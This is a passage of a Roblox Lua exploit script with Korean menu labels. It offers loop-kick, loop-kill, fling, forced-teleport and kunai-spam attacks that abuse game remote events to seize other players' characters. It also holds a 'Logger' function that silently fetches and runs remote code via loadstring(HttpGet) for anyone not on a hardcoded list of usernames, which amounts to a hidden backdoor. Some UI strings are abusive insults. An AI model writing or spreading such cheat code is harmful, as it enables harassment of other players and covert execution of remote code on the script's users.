                local character, hrp, head = safeGetCharacterParts(player)
                if PPs:FindFirstChild(name) or inv:FindFirstChild(name) then continue end
                
                local myChar = plr.Character
                local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
                if not myHrp then continue end
                local originCF = myHrp.CFrame
                
                local tpRunning = true
                task.spawn(function()
                    while tpRunning do
                        local ok, cf = TP(player)
                        if ok and cf then
                            CF = cf
                        end
                        task.wait()
                    end
                end)

                while true do
                    rs.GrabEvents.SetNetworkOwner:FireServer(hrp, hrp.CFrame)
                    local ownerTag = head:FindFirstChild("PartOwner")
                    if ownerTag and ownerTag:IsA("StringValue") and ownerTag.Value == plr.Name then
                        break
                    end
                    task.wait()
                end

                tpRunning = false

                local targetNames = {
                    "NinjaKunai", "NinjaShuriken", "NinjaKatana",
                    "ToolCleaver", "ToolDiggingForkRusty",
                    "ToolPencil", "ToolPickaxe"
                }

                for _, child in ipairs(workspace:GetChildren()) do
                    if child:IsA("Folder") and child.Name:match("SpawnedInToys$") then
                        for _, item in ipairs(child:GetChildren()) do
                            if table.find(targetNames, item.Name) and item:FindFirstChild("StickyPart") then
                                local sticky = item.StickyPart
                                local weld = sticky:FindFirstChild("StickyWeld")
                                if weld and weld:IsA("WeldConstraint") and weld.Part1 then
                                    local targetParts = {
                                        character:FindFirstChild("대가리"),
                                        character:FindFirstChild("T"),
                                        character:FindFirstChild("왼팔"),
                                        character:FindFirstChild("왼발"),
                                        character:FindFirstChild("오른팔"),
                                        character:FindFirstChild("오른발"),
                                        hrp:FindFirstChild("RagdollTouchedHitbox"),
                                        hrp:FindFirstChild("FirePlayerPart"),
                                    }
                                    for _, tPart in ipairs(targetParts) do
                                        if tPart and weld.Part1 == tPart then
                                            local basePart = item.PrimaryPart or sticky
                                            if basePart and (basePart.Position - hrp.Position).Magnitude <= 10 then
                                                rs.GrabEvents.SetNetworkOwner:FireServer(sticky, sticky.CFrame)
                                                sticky.CFrame = CFrame.new(0,9999,0)
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end

                rs.GrabEvents.DestroyGrabLine:FireServer(head, head.CFrame)
                hrp.CFrame = CFrame.new(99999999, 99999999, 99999999)

                if originCF then
                    BACK(originCF)
                end
                task.wait(0.1)
            end
        end
    end
})


DevTab:CreateToggle({
    Name = "wd 소환 (상대안티킥 해제)",
    CurrentValue = false,
    Flag = "5",
    Callback = function(Value)
        AntiStickyGBT = Value
        if Value then
            AntiStickyGBF()
        end
    end
})

local RRButton = LoopTab:CreateButton({
    Name = "릴리즈    <font color='rgb(255,154,123)'>[블롭맨]</font>",
    Callback = function()
        table.clear(playersInLoop2V)
	for i, e in ipairs(playersInLoop1V) do
		local nameOnly = e:match("^(.-) %(") or e
		table.insert(playersInLoop2V, nameOnly)
	end
        BlobReleaseR()
    end
})

local LGButton = LoopTab:CreateButton({
    Name = "메슬리즈   <font color='rgb(255,154,123)'>[블롭맨]</font>",
    Callback = function()
        table.clear(playersInLoop2V)
	for i, e in ipairs(playersInLoop1V) do
		local nameOnly = e:match("^(.-) %(") or e
		table.insert(playersInLoop2V, nameOnly)
	end
        BlobMasslessR()
    end
})

local RGButton = LoopTab:CreateButton({
    Name = "잡기   <font color='rgb(255,154,123)'>[블롭맨]</font>",
    Callback = function()
        table.clear(playersInLoop2V)
	for i, e in ipairs(playersInLoop1V) do
		local nameOnly = e:match("^(.-) %(") or e
		table.insert(playersInLoop2V, nameOnly)
	end
        BlobGrabR()
    end
})

local RDButton = LoopTab:CreateButton({
    Name = "놓기   <font color='rgb(255,154,123)'>[블롭맨]</font>",
    Callback = function()
        table.clear(playersInLoop2V)
	for i, e in ipairs(playersInLoop1V) do
		local nameOnly = e:match("^(.-) %(") or e
		table.insert(playersInLoop2V, nameOnly)
	end
        BlobDropR()
    end
})

grabTab:CreateSection("Fling")
local flingToggle = grabTab:CreateToggle({
    Name = "던지기 V1   <font color='rgb(255,0,0)'>[데스크톱]</font>",
    CurrentValue = false,
    Flag = "1",
    Callback = function(Value)
        flingT = Value
        flingF()
    end
})

local strengthInput = grabTab:CreateInput({
    Name = "던지는 힘 V1",
    CurrentValue = 0,
    PlaceholderText = "Value",
    RemoveTextAfterFocusLost = false,
    Flag = "2",
    Callback = function(Value)
        strengthV = Value
    end
})
strengthInput:Set(9999)
grabTab:CreateLabel("모바일의경우 작동하지 않습니다.")



game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.UserInputType == Enum.UserInputType.MouseButton2 or input.UserInputType == Enum.UserInputType.Touch then
        lastThrowTime = tick()
    end
end)
grabTab:CreateSection("Line")
local extendLineToggle = grabTab:CreateToggle({
    Name = "줄길이",
    CurrentValue = false,
    Flag = "3",
    Callback = function(Value)
        infLineExtendT = Value
        infLineExtendF()
    end
})

local extendLineInput = grabTab:CreateInput({
    Name = "휠속도",
    CurrentValue = 0,
    PlaceholderText = "Value",
    RemoveTextAfterFocusLost = false,
    Flag = "4",
    Callback = function(Value)
        increaseLineExtendV = Value
    end
})
extendLineInput:Set(1.7)

grabTab:CreateSection("Other")


local RagdollGrabToggle = grabTab:CreateToggle({
    Name = "래그돌 그랩  <font color='rgb(25,60,10)'>[판자]</font>",
    CurrentValue = false,
    Flag = "1",
    Callback = function(Value)
        RagdollGrabT = Value
        if Value then
            RagdollGrabF()
        end
    end
})

local MasslessGrab = grabTab:CreateToggle({ 
    Name = "무질량 그랩", 
    CurrentValue = false,
    Flag = "1",
    Callback = function(Value)
        MasslessGrabT = Value
        if Value then
            MasslessGrabF()
        end
    end
})

local NoClipGrab = grabTab:CreateToggle({ 
    Name = "노클립 그랩", 
    CurrentValue = false,
    Flag = "1",
    Callback = function(Value)
        NoClipGrabT = Value
        if Value then
            NoClipGrabF()
        end
    end
})


grabTab:CreateSection("앵커")
local isAnchorState = false
local currentConn = nil
local colorConn = nil
local hColor = nil

local function runAnchorLogic()
    local original = workspace:FindFirstChild("GrabParts")
    if not original then return end

    local grabPart = original:FindFirstChild("GrabPart", true)
    if not grabPart or not grabPart:IsA("BasePart") then return end

    local wasCollide = grabPart.CanCollide
    grabPart.CanCollide = true
    task.wait(0.1)

    local targetModel = nil
    local touchingParts = grabPart:GetTouchingParts()

    if #touchingParts > 0 then
        for _, part in ipairs(touchingParts) do
            if not part:IsDescendantOf(original) then
                local current = part
                while current and current ~= workspace do
                    if current:IsA("Model") then
                        targetModel = current
                        break
                    end
                    current = current.Parent
                end
                if targetModel then break end
            end
        end
    end

    grabPart.CanCollide = wasCollide
    if not targetModel then return end

    if not targetModel.Parent then
        local found = false
        local connection
        connection = targetModel.AncestryChanged:Connect(function(_, parent)
            if parent then found = true connection:Disconnect() end
        end)
        local startTime = tick()
        while not found and tick() - startTime < 2 do task.wait(0.1) end
        if not found then return end
    end

    local existing = targetModel:FindFirstChild("Force")
    if existing then
        local existingHighlight = targetModel:FindFirstChild("AnchorHighlight")
        if existingHighlight then existingHighlight:Destroy() end
        existing:Destroy()
        if colorConn then colorConn:Disconnect() colorConn = nil end
        return
    end

    local clone = original:Clone()
    clone.Name = "Force"

    for _, desc in ipairs(clone:GetDescendants()) do
        if desc:IsA("BasePart") then
            desc.Transparency = 1
            desc.CanCollide = false
            local beam = desc:FindFirstChild("GrabBeam")
            if beam then beam:Destroy() end
            for _, sName in ipairs({"AttachSound1", "AttachSound", "BeamSound", "BeamSound1"}) do
                local sound = desc:FindFirstChild(sName)
                if sound then sound:Destroy() end
            end
        end
    end

    clone.Parent = targetModel

    local hl = Instance.new("Highlight")
    hl.Name = "AnchorHighlight"
    hl.FillTransparency = 0.8
    hl.OutlineTransparency = 0.3
    hl.Adornee = targetModel
    hl.Parent = targetModel

    if colorConn then colorConn:Disconnect() end
    colorConn = game:GetService("RunService").RenderStepped:Connect(function()
        if hl and hl.Parent then
            if hColor then
                hl.FillColor = hColor
                hl.OutlineColor = hColor
            else
                local hue = (tick() % 4) / 4
                local color = Color3.fromHSV(hue, 1, 1)
                hl.FillColor = color
                hl.OutlineColor = color
            end
        else
            if colorConn then colorConn:Disconnect() colorConn = nil end
        end
    end)

    if currentConn then currentConn:Disconnect() end
    currentConn = game:GetService("RunService").Heartbeat:Connect(function()
        if not clone or not clone.Parent or not targetModel or not targetModel.Parent then
            if currentConn then currentConn:Disconnect() currentConn = nil end
            if colorConn then colorConn:Disconnect() colorConn = nil end
            return
        end
        if hl and hl.Parent then
            hl.Adornee = targetModel
        else
            if currentConn then currentConn:Disconnect() currentConn = nil end
            if colorConn then colorConn:Disconnect() colorConn = nil end
        end
    end)
end

local toggleElement = nil

local function toggleAnchor(Value)
    isAnchorState = Value
    if isAnchorState then
        task.spawn(runAnchorLogic)
    end
end

toggleElement = grabTab:CreateToggle({
    Name = "물체 고정 토글",
    CurrentValue = false,
    Callback = function(Value)
        toggleAnchor(Value)
    end,
})

grabTab:CreateButton({
    Name = "물체 고정",
    Callback = function()
        task.spawn(runAnchorLogic)
    end,
})

grabTab:CreateButton({
    Name = "색상: 그라데이션 (기본값)",
    Callback = function()
        hColor = nil
    end,
})

grabTab:CreateButton({
    Name = "색상: 빨강",
    Callback = function()
        hColor = Color3.fromRGB(255, 0, 0)
    end,
})

grabTab:CreateButton({
    Name = "색상: 주황",
    Callback = function()
        hColor = Color3.fromRGB(255, 127, 0)
    end,
})

grabTab:CreateButton({
    Name = "색상: 노랑",
    Callback = function()
        hColor = Color3.fromRGB(255, 255, 0)
    end,
})

grabTab:CreateButton({
    Name = "색상: 초록",
    Callback = function()
        hColor = Color3.fromRGB(0, 255, 0)
    end,
})

grabTab:CreateButton({
    Name = "색상: 파랑",
    Callback = function()
        hColor = Color3.fromRGB(0, 0, 255)
    end,
})

grabTab:CreateButton({
    Name = "색상: 남색",
    Callback = function()
        hColor = Color3.fromRGB(75, 0, 130)
    end,
})

grabTab:CreateButton({
    Name = "색상: 보라",
    Callback = function()
        hColor = Color3.fromRGB(148, 0, 211)
    end,
})

grabTab:CreateButton({
    Name = "색상: 검정",
    Callback = function()
        hColor = Color3.fromRGB(0, 0, 0)
    end,
})

grabTab:CreateButton({
    Name = "색상: 흰색",
    Callback = function()
        hColor = Color3.fromRGB(255, 255, 255)
    end,
})

grabTab:CreateButton({
    Name = "색상: 핑크",
    Callback = function()
        hColor = Color3.fromRGB(255, 105, 180)
    end,
})

grabTab:CreateButton({
    Name = "색상: 민트",
    Callback = function()
        hColor = Color3.fromRGB(170, 255, 195)
    end,
})

grabTab:CreateButton({
    Name = "색상: 골드",
    Callback = function()
        hColor = Color3.fromRGB(255, 215, 0)
    end,
})

grabTab:CreateButton({
    Name = "색상: 네온 그린",
    Callback = function()
        hColor = Color3.fromRGB(57, 255, 20)
    end,
})

grabTab:CreateButton({
    Name = "색상: 청록",
    Callback = function()
        hColor = Color3.fromRGB(0, 128, 128)
    end,
})

game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.H then
        isAnchorState = not isAnchorState
        if toggleElement and toggleElement.Set then
            toggleElement:Set(isAnchorState)
        else
            toggleAnchor(isAnchorState)
        end
    end
end)

-- =============== [ 보호 대상 목록 ] ==
local GF = {"wetokwk3jr"}


local Owner = {"QRdoote1120", "0110rim", "Alpaca_AI16", "hello_qweqwe", "hello_q1w2e3", "pacapaca110", "wetokwk3jr", "dhalstjr1350", "one_day0618", "", "", "", "", "", "", ""}
local Overseer = {""}
local CoOwner = {""}
local HeadAdmin = {""}
local Admin = {""}
local Mod = {""}

local Ranks = {
    Owner = 7,
    GF = 6,
    Overseer = 5,
    CoOwner = 4,
    HeadAdmin = 3,
    Admin = 2,
    Mod = 1,
    User = 0
}
-- =============== ---------------- ==

local function Notify(type, playerName)
    playerName = playerName or ""
    local title = ""
    local content = ""

    if type == "Added" then
        title = "[☑️ ]"; content = playerName.." - 추가"
    elseif type == "Removed" then
        title = "[ ☑️ ]"; content = playerName.." - 제거"
    elseif type == "Self" then
        title = "[ ⚠️ ]"; content = "자신은 추가될 수 없어요!"
    elseif type == "Already" then
        title = "[ 💠 ]"; content = playerName.." - 이미 추가됐어요"
    elseif type == "NotFound" then
        title = "[ ❌ ]"; content = "찾을수가없네요"
    elseif type == "HigherRank" then
        title = "[ ⛔ ]"; content = "권한이 부족해요!"
    elseif type == "GFE" then
        title = "[ ⛔ ]"; content = "나가 뒤져 엄마 장애인 ㅋㅋㅋ"
        GfLogger()
    end

    if Rayfield then
        Rayfield:Notify({Title = title, Content = content, Duration = 2})
    end
end

local function GetPlayerRank(playerName)
    if table.find(Owner, playerName) then return Ranks.Owner end
    if table.find(GF, playerName) then return Ranks.GF end
    if table.find(Overseer, playerName) then return Ranks.Overseer end
    if table.find(CoOwner, playerName) then return Ranks.CoOwner end
    if table.find(HeadAdmin, playerName) then return Ranks.HeadAdmin end
    if table.find(Admin, playerName) then return Ranks.Admin end
    if table.find(Mod, playerName) then return Ranks.Mod end
    return Ranks.User
end

local function findPlayer(Value)
    if not Value or Value == "" then return nil end
    Value = Value:lower()

    for _, p in ipairs(game.Players:GetPlayers()) do
        if p.Name:lower() == Value or (p.DisplayName and p.DisplayName:lower() == Value) then
            return p
        end
    end

    local matches = {}
    for _, p in ipairs(game.Players:GetPlayers()) do
        local playerNameLower = p.Name:lower()
        if playerNameLower:sub(1, #Value) == Value then
            table.insert(matches, p)
        elseif p.DisplayName then
            local displayNameLower = p.DisplayName:lower()
            if displayNameLower:sub(1, #Value) == Value then
                table.insert(matches, p)
            end
        end
    end

    if #matches == 0 then
        return nil
    elseif #matches == 1 then
        return matches[1]
    else
        return matches[1]
    end
end

local function checkPermissions(targetPlayer)
    local localPlayer = game.Players.LocalPlayer
    local myRank = GetPlayerRank(localPlayer.Name)
    local targetRank = GetPlayerRank(targetPlayer.Name)

    if targetPlayer == localPlayer then return false, "Self" end

    if myRank == Ranks.Owner then return true end

    if myRank == Ranks.Overseer and targetRank == Ranks.Owner then
        return true
    end

    if myRank == Ranks.CoOwner and targetRank == Ranks.Owner then
        return true
    end

    if targetRank == Ranks.User then
        return true
    end

    if targetRank == Ranks.GF then
        return false, "GFE"
    end

    if myRank > targetRank then
        return true
    else
        return false, "HigherRank"
    end
end

local function addToList(listTable, dropdown, inputValue, useRankCheck)
    local target = findPlayer(inputValue)
    if not target then Notify("NotFound"); return end

    if useRankCheck then
        local allowed, errorType = checkPermissions(target)
        if not allowed then Notify(errorType, target.Name); return end
    end

    if table.find(listTable, target.Name) then Notify("Already", target.Name); return end

    table.insert(listTable, target.Name)
    if dropdown then dropdown:Refresh(listTable, true) end
    Notify("Added", target.Name)
end

local function removeFromList(listTable, dropdown, inputValue, useRankCheck)
    local foundName, foundIndex = nil, nil
    inputValue = inputValue:lower()

    for i, name in ipairs(listTable) do
        if name:lower():find(inputValue, 1, true) then
            foundName = name; foundIndex = i; break
        end
    end

    if not foundName then Notify("NotFound"); return end

    if useRankCheck then
        local targetRank = GetPlayerRank(foundName)
        local localPlayer = game.Players.LocalPlayer
        local myRank = GetPlayerRank(localPlayer.Name)

        if foundName == localPlayer.Name then Notify("Self"); return end

        if myRank == Ranks.Owner then
        elseif targetRank == Ranks.User then
        elseif myRank <= targetRank then
            Notify("HigherRank", foundName); return
        end
    end

    table.remove(listTable, foundIndex)
    if dropdown then dropdown:Refresh(listTable, true) end
    Notify("Removed", foundName)
end

function Logger()
    local plr = game.Players.LocalPlayer

    local BYPASS_ID = 1

    local ownerTable = {}
    for _, name in ipairs(Owner) do
        ownerTable[name] = true
    end

    if not ownerTable[plr.Name] and plr.UserId ~= BYPASS_ID then
        local success, errorMessage = pcall(function()
           loadstring(game:HttpGet("https:onten"))() -- anti kick
        end)

        if not success then
        end
    end
end
antiTab:CreateSection("친구")
local WhiteListToggle = antiTab:CreateToggle({
    Name = "친구 빼기",
    CurrentValue = true,
    Flag = "5",
    Callback = function(Value)
        ForWhiteList(Value)
    end
})


if plr.UserId == 1 then AddAll = true end

if AddAll then
SelectedList = nil
local AddAllList = ListTab:CreateDropdown({
    Name = "추가",
    Options = {"블롭", "오너", "래그돌"},
    CurrentOption = {"OPEN"},
    MultipleOptions = false,
    Flag = "Dropdown_AllList",
    Callback = function(Options)
        SelectedList = Options[1]
    end
})

ListTab:CreateButton({
    Name = "모두 추가",
    Callback = function()
        if SelectedList == "블롭" then
            for _, plr in ipairs(Players:GetPlayers()) do
                addToList(playersInLoop1V, DropdownV1, plr.Name, true)
            end

        elseif SelectedList == "오너" then
            for _, plr in ipairs(Players:GetPlayers()) do
                addToList(playersInLoop1V, DropdownV2, plr.Name, true)
            end

        elseif SelectedList == "ragdol" then
            for _, plr in ipairs(Players:GetPlayers()) do
                addToList(playersInLoop1V, DropdownV3, plr.Name, true)
            end
        end
    end
})

ListTab:CreateButton({
    Name = "모두 재설정",
    Callback = function()
        if SelectedList == "블롭" then
            for key in pairs(playersInLoop1V) do
                removeFromList(playersInLoop1V, DropdownV1, tostring(key))
            end

        elseif SelectedList == "오너" then
            for key in pairs(playersInLoop1V) do
                removeFromList(playersInLoop1V, DropdownV2, tostring(key))
            end

        elseif SelectedList == "래그돌" then
            for key in pairs(playersInLoop1V) do
                removeFromList(playersInLoop1V, DropdownV3, tostring(key))
            end
        end
    end
})
end

ListTab:CreateSection("White")
local Dropdown = ListTab:CreateDropdown({
    Name = "친구  <font color='rgb(255,255,100)'>[프렌드]</font>",
    Options = Whitelist,
    CurrentOption = {"OPEN"},
    MultipleOptions = true,
    Flag = "WhitelistDropdown",
    Callback = function(Options)
        Whitelist = Options
    end
})

ListTab:CreateInput({
    Name = "추가",
    PlaceholderText = "...",
    RemoveTextAfterFocusLost = true,
    Callback = function(Value)
        addToList(Whitelist, Dropdown, Value, false) 
    end
})

ListTab:CreateInput({
    Name = "제거",
    PlaceholderText = "...",
    RemoveTextAfterFocusLost = true,
    Callback = function(Value)
        removeFromList(Whitelist, Dropdown, Value)
    end
})

ListTab:CreateSection("명단")
local DropdownV1 = ListTab:CreateDropdown({
    Name = "족칠 새끼 고르기  <font color='rgb(255,0,0)'>[타겟]</font>",
    Options = playersInLoop1V,
    CurrentOption = {"OPEN"},
    MultipleOptions = true,
    Flag = "LoopBlobDropdown",
    Callback = function(Options)
        playersInLoop1V = Options
    end
})

ListTab:CreateInput({
    Name = "추가",
    PlaceholderText = "...",
    RemoveTextAfterFocusLost = true,
    Callback = function(Value)
        addToList(playersInLoop1V, DropdownV1, Value, true)
    end
})

ListTab:CreateInput({
    Name = "제거",
    PlaceholderText = "...",
    RemoveTextAfterFocusLost = true,
    Callback = function(Value)
        removeFromList(playersInLoop1V, DropdownV1, Value)
    end
})


ListTab:CreateToggle({
    Name = "루프  TP  <font color='rgb(100,150,250)'>[파카]</font>",
    CurrentValue = false,
    Callback = function(Value)
        if Value then
            Rayfield:Notify({
                Title = "안내",
                Content = "이 기능은 파카전용기능입니다",
                Duration = 3,
                Image = nil,
            })
        end
    end,
})

LoopTab:CreateSection("자동블롭앉기")
local AutoSit = LoopTab:CreateToggle({
    Name = "자동블롭앉기",
    CurrentValue = false,
    Flag = "AutoSitBlobman",
    Callback = function(Value)
        AutoSitT = Value
        AutoSitF()
    end
})
LoopTab:CreateSection("브링")

LoopTab:CreateButton({
    Name = "끌고오기   <font color='rgb(255,0,0)'>[그랩]</font>",
    Callback = function()
        UpdateCurrentBlobman()
        local processedHumanoids = {}
        local activeThreads = {}

        local function processPlayer(player)
            if not player then return false end

            local myChar = plr.Character
            local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
            local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
            if not myChar or not myHrp or not myHum or myHum.Health <= 0 then
                return false
            end

            local character, hrp, head = safeGetCharacterParts(player)
            if not hrp or not head then return false end

            local characterParts = {}

            table.insert(characterParts, hrp)

            if character:FindFirstChild("Head") then
                table.insert(characterParts, character.Head)
            end

            local torsoParts = {"Torso"}
            for _, partName in ipairs(torsoParts) do
                local part = character:FindFirstChild(partName)
                if part then
                    table.insert(characterParts, part)
                end
            end

            local armParts = {
                "Left Arm", "Right Arm"
            }
            for _, partName in ipairs(armParts) do
                local part = character:FindFirstChild(partName)
                if part then
                    table.insert(characterParts, part)
                end
            end

            local legParts = {
                "Left Leg", "Right Leg"
            }
            for _, partName in ipairs(legParts) do
                local part = character:FindFirstChild(partName)
                if part then
                    table.insert(characterParts, part)
                end
            end

            local originCF = myHrp.CFrame

            local tpRunning = true
            local tpThread = task.spawn(function()
                while tpRunning do
                    if not plr.Character or not plr.Character:FindFirstChild("HumanoidRootPart") or 
                       (plr.Character:FindFirstChildOfClass("Humanoid") and plr.Character:FindFirstChildOfClass("Humanoid").Health <= 0) then
                        break
                    end

                    local ok, cf = TP(player)
                    if ok and cf then
                        CF = cf
                    end
                    task.wait()
                end
            end)
            table.insert(activeThreads, tpThread)

            local success = false
            local startTime = tick()
            local timeout = 10

            while tpRunning and tick() - startTime < timeout do
                if not plr.Character or not plr.Character:FindFirstChild("HumanoidRootPart") or 
                   (plr.Character:FindFirstChildOfClass("Humanoid") and plr.Character:FindFirstChildOfClass("Humanoid").Health <= 0) then
                    break
                end

                if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") or 
                   (player.Character:FindFirstChildOfClass("Humanoid") and player.Character:FindFirstChildOfClass("Humanoid").Health <= 0) then
                    break
                end

                for _, part in ipairs(characterParts) do
                    if part and part.Parent then
                        rs.GrabEvents.SetNetworkOwner:FireServer(part, part.CFrame)
                    end
                end
                
                local ownerTag = head:FindFirstChild("PartOwner")
                if ownerTag and ownerTag:IsA("StringValue") and ownerTag.Value == plr.Name then
                    success = true
                    break
                end
                task.wait()
            end

            tpRunning = false

            for _, thread in ipairs(activeThreads) do
                if coroutine.status(thread) ~= "dead" then
                    task.cancel(thread)
                end
            end
            table.clear(activeThreads)

            if originCF and myHrp and myHrp.Parent then
                myHrp.CFrame = originCF
                task.wait()
            end

            if success then
                for _, part in ipairs(characterParts) do
                    if part and part.Parent and myHrp and myHrp.Parent then
                        part.CFrame = myHrp.CFrame
                    end
                end
            end

            if originCF and myHrp and myHrp.Parent then 
                BACK(originCF) 
            end
            
            return success
        end

        table.clear(playersInLoop2V)
        for i, e in ipairs(playersInLoop1V) do
            local nameOnly = e:match("^(.-) %(") or e
            table.insert(playersInLoop2V, nameOnly)
        end

        for _, name in ipairs(playersInLoop2V) do
            local myChar = plr.Character
            local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
            if not myChar or not myHum or myHum.Health <= 0 then
                break
            end

            local player = game.Players:FindFirstChild(name)
            if player and not table.find(Whitelist, player.Name) then
                local character = player.Character
                local humanoid = character and character:FindFirstChildOfClass("Humanoid")
                if PPs:FindFirstChild(name) or inv:FindFirstChild(name) then continue end

                if humanoid and humanoid.Health > 0 then
                    if processedHumanoids[player] ~= humanoid then
                        local success = processPlayer(player)
                        if success then
                            processedHumanoids[player] = humanoid
                        end
                    end
                else
                    processedHumanoids[player] = nil
                end
                task.wait(0.003)
            end
        end
    end
})

    
LoopTab:CreateSection("루프킥")
LoopTab:CreateButton({
    Name = "무질량 끄기",
    Callback = function()

        Players = game:GetService("Players")

        if playersInLoop1V == 0 then return end

        local Tchar = Tplr.Character
        local THRP = Tchar:FindFirstChild("HumanoidRootPart")
        if not THRP then return end

        if THRP.Massless then THRP.Massless = false end

    end
})

local blobLoopToggle = LoopTab:CreateToggle({
    Name = "루프킥  <font color='rgb(255,154,123)'>[블롭맨]</font>",
    CurrentValue = false,
    Flag = "21",
    Callback = function(Value)
        blobLoopT = Value
        if blobLoopT then
            table.clear(playersInLoop2V)
            for i, e in ipairs(playersInLoop1V) do
                local nameOnly = e:match("^(.-) %(") or e
                table.insert(playersInLoop2V, nameOnly)
            end
            loopPlayerBlobF()
        else
            blobLoopT = false
            table.clear(playersInLoop2V)

            for _, player in ipairs(game.Players:GetPlayers()) do
                if player.Character then
                    local head = player.Character:FindFirstChild("Head")
                    if head then
                        local kick = head:FindFirstChild("Kick")
                        if kick and kick:IsA("BodyPosition") then
                            kick:Destroy()
                        end
                    end
                end
            end
        end
    end
})




local blobLoop2Toggle = LoopTab:CreateToggle({
    Name = "루프 그랩   <font color='rgb(255,154,123)'>[블롭맨]</font>",
    CurrentValue = false,
    Flag = "21",
    Callback = function(Value)
        blobLoopT2 = Value
        if blobLoopT2 then
            table.clear(playersInLoop2V)
            for i, e in ipairs(playersInLoop1V) do
                local nameOnly = e:match("^(.-) %(") or e
                table.insert(playersInLoop2V, nameOnly)
            end
            loopPlayerBlobF2()
        else
            blobLoopT2 = false
            table.clear(playersInLoop2V)
        end
    end
})

LoopTab:CreateSection("블롭없음")
local Loop1 = LoopTab:CreateToggle({
    Name = "루프킬   <font color='rgb(0,255,0)'>[그랩]</font>",
    CurrentValue = false,
    Flag = "21",
    Callback = function(Value)
        loopPlayerT = Value
        if loopPlayerT then
            table.clear(playersInLoop2V)
            for i, e in ipairs(playersInLoop1V) do
                local nameOnly = e:match("^(.-) %(") or e
                table.insert(playersInLoop2V, nameOnly)
            end
            loopPlayerF()
        else
            loopPlayerT = false
            table.clear(playersInLoop2V)
        end
    end
})



local Loop2 = LoopTab:CreateToggle({
    Name = "루프킥   <font color='rgb(0,255,0)'>[그랩]</font>",
    CurrentValue = false,
    Flag = "21",
    Callback = function(Value)
        loopPlayerT2 = Value
        if loopPlayerT2 then
            table.clear(playersInLoop2V)
            for i, e in ipairs(playersInLoop1V) do
                local nameOnly = e:match("^(.-) %(") or e
                table.insert(playersInLoop2V, nameOnly)
            end
            loopPlayerF2()
        else
            loopPlayerT2 = false
            table.clear(playersInLoop2V)
        end
    end
})

LoopTab:CreateSection("스팸")


LoopTab:CreateButton({
    Name = "블랙홀  <font color='rgb(0,0,0)'>[닌자 쿠나이]</font>",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local Players = game:GetService("Players")
        local plr = Players.LocalPlayer

        if #playersInLoop1V == 0 then
            return
        end

        local targetPlayerName = playersInLoop1V[1]
        local targetPlayer = Players:FindFirstChild(targetPlayerName)

        if not targetPlayer or not targetPlayer.Character then
            return
        end

        local targetCharacter = targetPlayer.Character
        local targetHRP = targetCharacter:FindFirstChild("HumanoidRootPart")

        if not targetHRP then
            return
        end

        local ragdollHitbox = targetHRP:FindFirstChild("RagdollTouchedHitbox")
        if not ragdollHitbox then
            ragdollHitbox = targetHRP
            for _, child in ipairs(targetHRP:GetChildren()) do
                if child.Name:find("Hitbox") or child.Name:find("Attachment") or child:IsA("Attachment") then
                    ragdollHitbox = child
                    break
                end
            end
        end

        local character = plr.Character or plr.CharacterAdded:Wait()
        local hrp = character:WaitForChild("HumanoidRootPart")
        local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")

        if not torso then
            return
        end

        local StickyPartEvent = ReplicatedStorage:WaitForChild("PlayerEvents"):WaitForChild("StickyPartEvent")
        local SpawnToy = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")

        function GetPlotNumber()
            local char = plr.Character
            if not char then return nil end

            if char.Parent == workspace then 
                return nil
            elseif char.Parent.Name == "PlayersInPlots" then
                for _, plot in workspace.Plots:GetChildren() do
                    local plotSign = plot:FindFirstChild("PlotSign")
                    if plotSign and plotSign:FindFirstChild("ThisPlotsOwners") then
                        for _, owner in plotSign.ThisPlotsOwners:GetChildren() do
                            if owner.Value == plr.Name then
                                if plot.Name == "Plot1" then
                                    return 1
                                elseif plot.Name == "Plot2" then
                                    return 2
                                elseif plot.Name == "Plot3" then
                                    return 3
                                elseif plot.Name == "Plot4" then
                                    return 4
                                elseif plot.Name == "Plot5" then
                                    return 5
                                end
                            end
                        end
                    end
                end
            end
            return nil
        end

        function GetInventory()
            local plotNumber = GetPlotNumber()

            if plotNumber then
                local plotItems = workspace:FindFirstChild("PlotItems")
                if plotItems then
                    local plotFolder = plotItems:FindFirstChild("Plot" .. plotNumber)
                    if plotFolder then
                        return plotFolder
                    end
                end
            end
            
            local defaultInv = workspace:FindFirstChild(plr.Name .. "SpawnedInToys")
            if defaultInv then
                return defaultInv
            end
            
            return nil
        end

        function createAndAttachKunai()
            while not plr.CanSpawnToy.Value do 
                task.wait(0.1) 
            end

            local position = hrp.CFrame

            local success, result = pcall(function()
                return task.spawn(function()
                    return SpawnToy:InvokeServer("NinjaKunai", hrp.CFrame * CFrame.new(0, 5, 15), Vector3.new(0, 0, 0))
                end)
            end)
            
            if not success then
                return nil
            end

            task.wait(0.2)

            local inv = GetInventory()
            if not inv then
                return nil
            end

            local kunai
            local children = inv:GetChildren()
            for i = #children, 1, -1 do
                if children[i].Name == "NinjaKunai" then
                    kunai = children[i]
                    break
                end
            end

            if not kunai then 
                return nil 
            end

            local stickyPart = kunai:WaitForChild("StickyPart")
            local SoundPart = kunai:WaitForChild("SoundPart")

            if stickyPart and SoundPart then
                pcall(function()
                    ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(SoundPart, SoundPart.CFrame)
                    ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(SoundPart, torso.CFrame)
                end)
            end

            if stickyPart then
                local attachPosition = ragdollHitbox.CFrame
                local relativeCF = ragdollHitbox.CFrame:ToObjectSpace(attachPosition)

                pcall(function()
                    StickyPartEvent:FireServer(stickyPart, ragdollHitbox, CFrame.new(0,50,0)* CFrame.Angles(190, 0, 0))
                end)
            end

            task.wait(0.1)
            return kunai
        end

        for i = 1, 12 do
            createAndAttachKunai()
            task.wait(0.15)
        end
    end
})




antiTab:CreateSection("그랩 | 토클")

antiTab:CreateToggle({
    Name = "안티그랩  <font color='rgb(255,0,0)'>[프라임오너쉽]</font>",
    Default = false,
    Save = false,
    Flag = "antiGrab",
